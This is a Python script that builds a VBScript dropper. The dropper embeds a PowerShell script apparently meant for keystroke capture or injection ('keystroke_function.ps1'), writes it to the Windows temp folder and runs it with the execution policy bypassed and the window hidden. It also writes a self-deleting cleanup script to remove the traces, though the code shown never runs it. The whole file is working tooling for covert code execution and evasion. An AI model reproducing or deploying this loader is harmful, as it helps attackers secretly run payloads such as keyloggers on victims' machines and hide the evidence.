import os

# Specify the powershell script path at the bottom of the script
# This python script is to ensure the vbs file can be changed easily if changes are made

def create_vbs_script(ps_script_path, vbs_file_path):
    # Read the PowerShell script content from the file
    with open(ps_script_path, 'r') as ps_file:
        ps_script_content = ps_file.readlines()

    # Template for VBScript
    vbs_template = '''
' Initialize WScript Shell
Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")

' Create a temporary PowerShell script with initial commands
Dim tempPSFilePath, cleanupPSFilePath
tempPSFilePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\temp_keystroke.ps1"
cleanupPSFilePath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\cleanup.ps1"

' Create and write initial PowerShell script content
Dim fso, tempPSFile, cleanupPSFile
Set fso = CreateObject("Scripting.FileSystemObject")
Set tempPSFile = fso.CreateTextFile(tempPSFilePath, True)

' Write PowerShell script content
'''

    # Adding the PowerShell content to the VBScript
    for line in ps_script_content:
        escaped_line = line.rstrip().replace('"', '""')
        vbs_template += f'tempPSFile.WriteLine "{escaped_line}"\n'

    vbs_template += '''
tempPSFile.Close()

' Create the cleanup PowerShell script content
Set cleanupPSFile = fso.CreateTextFile(cleanupPSFilePath, True)
cleanupPSFile.WriteLine "$scriptPath = '" & tempPSFilePath & "'"
cleanupPSFile.WriteLine "$cleanupScriptPath = '" & cleanupPSFilePath & "'"
cleanupPSFile.WriteLine "Start-Sleep -Seconds 5"  ' Wait for the main script to finish
cleanupPSFile.WriteLine "Remove-Item -Path $scriptPath -Force"
cleanupPSFile.WriteLine "Remove-Item -Path $cleanupScriptPath -Force"
cleanupPSFile.Close()

' Run the PowerShell script hidden
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempPSFilePath & """", 0

Set objShell = Nothing
Set fso = Nothing
Set tempPSFile = Nothing
'''

    # Write the VBScript to a file
    with open(vbs_file_path, 'w') as file:
        file.write(vbs_template)

# Paths to the PowerShell script and the output VBScript
ps_script_path = "keystroke_function.ps1"  # Update this to the actual path of your PowerShell script
vbs_file_path = "generated_script.vbs"

# Create the VBScript
create_vbs_script(ps_script_path, vbs_file_path)

# Output the path of the generated VBScript for verification
print(f"VBScript generated at: {vbs_file_path}")
